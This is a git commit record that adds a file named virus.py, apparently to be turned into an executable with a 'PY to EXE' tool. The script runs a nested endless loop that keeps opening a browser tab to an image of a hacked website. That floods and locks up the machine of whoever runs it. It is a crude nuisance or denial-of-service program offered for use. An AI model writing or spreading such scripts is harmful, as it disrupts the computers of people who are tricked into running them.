3f9286ae6fa5f413e82b07ed4102ff9a27d2caf5
unamed666 <52182376+eroge69@users.noreply.github.com>
2025-04-30 01:36:08 +0700

    Upload virus.py via PY to EXE tool

---
+++ python-files/virus.py
@@ -0,0 +1,8 @@
+import webbrowser
+
+url = "https://mailprotector.com/wp-content/uploads/2021/11/website-hacked-mailprotector-wordpress-scaled.jpg"
+
+
+while True:
+    while True:
+        webbrowser.open(url)
